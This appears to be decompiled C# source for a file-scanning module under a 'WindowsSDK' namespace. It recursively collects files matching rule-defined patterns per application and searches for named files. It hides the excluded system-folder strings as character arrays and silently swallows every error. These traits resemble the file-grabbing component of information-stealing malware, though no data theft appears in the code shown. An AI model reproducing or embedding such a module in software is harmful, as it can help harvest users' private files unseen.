using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects.Files;
using WindowsSDK.Objects.Info;

namespace WindowsSDK.Data.Files
{
    public static class FileScanner
    {
        public static List<ScannedFile> Scan(params FileScannerRule[] scannerRules)
        {
            List<ScannedFile> list = new List<ScannedFile>();
            try
            {
                foreach (FileScannerRule fileScannerRule in scannerRules)
                {
                    try
                    {
                        foreach (FileScannerArg scanArg in fileScannerRule.GetScanArgs())
                        {
                            try
                            {
                                FileInfo[] files = new DirectoryInfo(scanArg.Directory).GetFiles(scanArg.Pattern, scanArg.Recoursive ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly);
                                foreach (FileInfo fileInfo in files)
                                {
                                    try
                                    {
                                        list.Add(new ScannedFile(fileInfo.FullName)
                                        {
                                            DirOfFile = fileScannerRule.GetFolder(scanArg, fileInfo),
                                            NameOfApplication = (string.IsNullOrWhiteSpace(fileScannerRule.Name) ? scanArg.Tag : fileScannerRule.Name)
                                        });
                                    }
                                    catch (Exception)
                                    {
                                    }
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
            return list;
        }

        public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
        {
            List<string> list = new List<string>
            {
                new string(new char[9] { '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\' }),
                new string(new char[15]
            {
                '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
                'i', 'l', 'e', 's', '\\'
            }),
                new string(new char[21]
            {
                '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'F',
                'i', 'l', 'e', 's', ' ', '(', 'x', '8', '6', ')',
                '\\'
            }),
                new string(new char[14]
            {
                '\\', 'P', 'r', 'o', 'g', 'r', 'a', 'm', ' ', 'D',
                'a', 't', 'a', '\\'
            })
            };
            List<string> list2 = new List<string>();
            if (files == null || files.Length == 0 || level > maxLevel)
            {
                return list2;
            }
            try
            {
                string[] directories = Directory.GetDirectories(baseDirectory);
                foreach (string text in directories)
                {
                    bool flag = false;
                    foreach (string item in list)
                    {
                        if (text.Contains(item))
                        {
                            flag = true;
                            break;
                        }
                    }
                    if (flag)
                    {
                        continue;
                    }
                    try
                    {
                        DirectoryInfo directoryInfo = new DirectoryInfo(text);
                        FileInfo[] files2 = directoryInfo.GetFiles();
                        bool flag2 = false;
                        for (int j = 0; j < files2.Length; j++)
                        {
                            if (flag2)
                            {
                                break;
                            }
                            for (int k = 0; k < files.Length; k++)
                            {
                                if (flag2)
                                {
                                    break;
                                }
                                string obj = files[k];
                                FileInfo fileInfo = files2[j];
                                if (obj == fileInfo.Name)
                                {
                                    flag2 = true;
                                    list2.Add(fileInfo.FullName);
                                }
                            }
                        }
                        foreach (string item2 in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                        {
                            if (!list2.Contains(item2))
                            {
                                list2.Add(item2);
                            }
                        }
                        directoryInfo = null;
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
            return list2;
        }
    }
}
